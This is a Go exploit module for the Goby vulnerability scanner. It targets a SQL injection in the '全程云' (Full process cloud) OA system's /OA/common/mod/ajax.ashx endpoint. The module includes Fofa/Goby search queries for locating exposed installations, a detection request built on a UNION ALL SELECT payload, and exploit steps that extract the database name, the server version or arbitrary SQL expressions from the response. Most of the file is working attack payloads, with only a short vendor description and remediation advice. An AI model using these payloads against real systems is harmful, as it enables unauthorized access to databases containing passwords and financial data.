package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Full process cloud /OA/common/mod/ajax.ashx SQL Injection Vulnerability",
    "Description": "<p>Full process cloud OA provides enterprises with 26 functions including daily office management, document management, work requests, reporting, archives, knowledge system, budget control, etc., with over 100 sub modules. To provide efficient and smooth information channels within the enterprise, while also vigorously promoting the development of the company's information system, improving the level of office automation and comprehensive management, accelerating the circulation of enterprise information, and enhancing the enterprise's market competitiveness.Due to improper parameter filtering on the ajax.ashx page of the cloud OA office system, there is an SQL injection vulnerability that unauthorized attackers can exploit to obtain sensitive information from the database</p>",
    "Product": "Full process cloud OA",
    "Homepage": "https://oa.24om.com/",
    "DisclosureDate": "2024-11-12",
    "PostTime": "2024-11-27",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"办公\" && body=\"全程云\"",
    "GobyQuery": "body=\"办公\" && body=\"全程云\"",
    "Level": "1",
    "Impact": "<p>Attackers can access sensitive information in the database, such as user passwords, bank accounts, etc., leading to the leakage of user privacy.</p>",
    "Recommendation": "<p>1. Strictly verify and filter user input to ensure the legitimacy and security of input data. </p><p>2. Use pre compiled statements. </p><p>3. Escaping special characters entering the database. </p><p> The manufacturer has released the latest version, follow us <a href=\"https://oa.24om.com/\">https://oa.24om.com/</a></p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/135415994?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "@@version",
            "show": "attackType=custom"
        },
        {
            "name": "default",
            "type": "select",
            "value": "DB_NAME(),@@version",
            "show": "attackType=default"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/OA/common/mod/ajax.ashx",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": "dll=DispartSell_Core.dll&class=DispartSell_Core.BaseData.DrpDataManager&method=GetProductById&id=1 UNION ALL SELECT NULL,{{{payload_md5}}},NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{{{rand4_md5}}}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/OA/common/mod/ajax.ashx",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": "dll=DispartSell_Core.dll&class=DispartSell_Core.BaseData.DrpDataManager&method=GetProductById&id=1 UNION ALL SELECT NULL,{{{payload_url}}},NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|\"sCode\":\"(.*?)\"",
                "output|when|attackType=sqlpoint|{{{lastreq}}} dll=DispartSell_Core.dll&class=DispartSell_Core.BaseData.DrpDataManager&method=GetProductById&id=1 UNION ALL SELECT NULL,DB_NAME(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "全程云 /OA/common/mod/ajax.ashx SQL 注入漏洞",
            "Product": "全程云OA",
            "Description": "<p>全程云OA为企业提供日常办公管理、公文管理、工作请示、汇报、档案、知识体系、预算控制等26个功能，超过100多个子模块。为企业内部提供高效、畅通的信息渠道，同时也能大力推动公司信息系统发展，提高企业的&nbsp;办公自动化&nbsp;程度和综合管理水平，加快企业信息的流通，提高企业市场竞争能力。<br><br>由于全程云&nbsp;oa办公系统&nbsp;ajax.ashx页面参数过滤不当，导致存在sql注入漏洞，未授权的攻击者可利用该漏洞获取数据库中的敏感信息<br></p>",
            "Recommendation": "<p>1、对用户输入进行严格的验证和过滤，确保输入数据的合法性和安全性。<br>2、使用预编译语句。<br>3、对进入数据库的特殊字符进行转义处理。<br></p><p>厂商已发布最新版本，关注 <a href=\"https://oa.24om.com/\">https://oa.24om.com/</a></p>",
            "Impact": "<p>攻击者可以读取数据库中的敏感信息，如用户密码、银行账户等，导致用户隐私泄露。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Full process cloud /OA/common/mod/ajax.ashx SQL Injection Vulnerability",
            "Product": "Full process cloud OA",
            "Description": "<p>Full process cloud OA provides enterprises with 26 functions including daily office management, document management, work requests, reporting, archives, knowledge system, budget control, etc., with over 100 sub modules. To provide efficient and smooth information channels within the enterprise, while also vigorously promoting the development of the company's information system, improving the level of office automation and comprehensive management, accelerating the circulation of enterprise information, and enhancing the enterprise's market competitiveness.Due to improper parameter filtering on the ajax.ashx page of the cloud OA office system, there is an SQL injection vulnerability that unauthorized attackers can exploit to obtain sensitive information from the database<br></p>",
            "Recommendation": "<p>1. Strictly verify and filter user input to ensure the legitimacy and security of input data.&nbsp;</p><p>2. Use pre compiled statements.&nbsp;</p><p>3. Escaping special characters entering the database.&nbsp;</p><p>&nbsp;The manufacturer has released the latest version, follow us <a href=\"https://oa.24om.com/\">https://oa.24om.com/</a><br></p>",
            "Impact": "<p>Attackers can access sensitive information in the database, such as user passwords, bank accounts, etc., leading to the leakage of user privacy.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "rand4": "define|variable|{{{rand|int|4}}}",
        "rand4_md5": "define|md5|{{{rand4}}}",
        "payload_md5": "define|variable|LOWER(CONVERT(varchar(32), HASHBYTES('MD5', '{{{rand4}}}'), 2))",
        "payload_url": "define|variable|{{{payload}}}"
    },
    "VariablesOrder": [
        "payload",
        "rand4",
        "rand4_md5",
        "payload_md5",
        "payload_url"
    ],
    "EditType": "fast",
    "PocId": "9974"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
